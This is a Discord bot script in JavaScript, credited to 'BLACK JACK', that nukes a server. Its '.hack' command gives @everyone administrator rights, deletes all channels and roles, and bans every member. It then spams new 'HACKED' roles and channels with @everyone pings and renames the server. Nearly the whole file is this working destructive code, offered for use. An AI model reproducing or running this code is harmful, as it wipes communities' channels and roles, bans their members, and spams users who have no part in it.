const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '.'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

          


          
client.on("ready", () => {
  console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
  console.log('hack by BLACK JACK');/////BLACK JACK 
console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
  console.log("im ready for hack server")
console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(`${prefix}help | BOT SESTAM NEW  ${client.guilds.size}`)///////shtek bnwsa
 client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
  console.log(`Logined`)
})
///created by black jack 

client.on('message', message => {
    if (message.content.startsWith(prefix + "hack")) {
        message.delete();
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]///premission akata adminstator
        });
        message.guild.channels.map(c => {
            c.delete();
        });
    message.guild.members.forEach(m =>{
                    m.ban()
                })
      message.guild.roles.forEach(r =>{
                    r.delete()
                })
      
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            })
        }, 1000);
        message.guild.setIcon("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
        client.user.setAvatar("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
        client.user.setUsername("HACKED")
        message.guild.setName('HACKED');
        setTimeout(function() {
            setInterval(() => {
              
                message.guild.createChannel('HACKED BY BLACK JACK', 'text').then(channel => { 
                channel.send('@everyone HACK BY BLACK JACK :joy: :joy: :joy:')
               
                })
            }
                        
                        , 500)
            })
        }
    
                   
    }

          )

 ////codaka drwst krawa lalayan black jack
///just for test
client.login("")
          